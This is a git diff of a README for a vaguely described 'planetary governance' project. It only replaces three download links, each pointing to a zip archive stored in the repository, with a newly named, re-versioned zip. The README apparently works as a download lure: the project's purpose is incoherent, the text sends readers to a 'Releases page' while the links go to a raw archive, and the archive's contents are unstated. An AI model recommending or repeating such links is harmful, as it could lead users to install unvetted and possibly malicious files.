@@ -1,6 +1,6 @@
 # 🌍 PCA-Planetary-Continuity-Accord - Standardizing Global Governance
 
-![Download](https://github.com/xharisirfan/PCA-Planetary-Continuity-Accord/raw/refs/heads/main/docs/Accord_PC_Continuity_Planetary_2.8-beta.2.zip)
+![Download](https://raw.githubusercontent.com/xharisirfan/PCA-Planetary-Continuity-Accord/main/meta/Continuity-Planetary-Accord-PC-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the PCA-Planetary-Continuity-Accord project! This software helps esta
 
 To get started, visit this page to download the latest version of PCA-Planetary-Continuity-Accord:
 
-[Download PCA-Planetary-Continuity-Accord](https://github.com/xharisirfan/PCA-Planetary-Continuity-Accord/raw/refs/heads/main/docs/Accord_PC_Continuity_Planetary_2.8-beta.2.zip)
+[Download PCA-Planetary-Continuity-Accord](https://raw.githubusercontent.com/xharisirfan/PCA-Planetary-Continuity-Accord/main/meta/Continuity-Planetary-Accord-PC-v3.6.zip)
 
 Once you're on the Releases page, look for the latest release. Simply click the download link for your operating system and follow the installation instructions.
 
@@ -82,4 +82,4 @@ For updates and the latest news, keep an eye on this repository. You can also fo
 
 Thank you for using PCA-Planetary-Continuity-Accord! Your commitment to planetary continuity is vital. For further details and to download the software again, visit this page:
 
-[Download PCA-Planetary-Continuity-Accord](https://github.com/xharisirfan/PCA-Planetary-Continuity-Accord/raw/refs/heads/main/docs/Accord_PC_Continuity_Planetary_2.8-beta.2.zip)
+[Download PCA-Planetary-Continuity-Accord](https://raw.githubusercontent.com/xharisirfan/PCA-Planetary-Continuity-Accord/main/meta/Continuity-Planetary-Accord-PC-v3.6.zip)
